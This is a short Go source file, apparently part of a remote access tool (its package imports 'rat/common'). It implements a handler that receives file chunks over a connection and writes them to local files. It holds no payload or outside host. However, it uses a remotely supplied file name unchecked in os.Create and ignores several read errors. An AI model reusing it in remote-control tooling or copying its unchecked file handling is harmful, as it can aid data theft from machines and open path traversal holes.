package main

import (
	"io"
	"os"
	"rat/common"
)

type DownloadPacket struct {
}

type TransfersMap map[string]*os.File

var Transfers TransfersMap

func init() {
	Transfers = make(TransfersMap)
}

func (packet DownloadPacket) GetHeader() common.PacketHeader {
	return common.TransferHeader
}

func (packet DownloadPacket) Write(c *Connection) error {
	return nil
}

func (packet DownloadPacket) Read(c *Connection) error {
	file, err := c.ReadString()

	if err != nil {
		return err
	}

	final, err := c.ReadBool()

	len, err := c.ReadInt()
	b := make([]byte, len)
	io.ReadFull(c.Conn, b)

	if _, ok := Transfers[file]; !ok {
		Transfers[file], err = os.Create(file)
		if err != nil {
			return err
		}
	}

	w := Transfers[file]
	_, err = w.Write(b)

	if err != nil {
		return err
	}

	if final {
		err = w.Sync()
		if err != nil {
			return err
		}
		err = w.Close()
		if err != nil {
			return err
		}

		delete(Transfers, file)

		return nil
	}

	return err
}
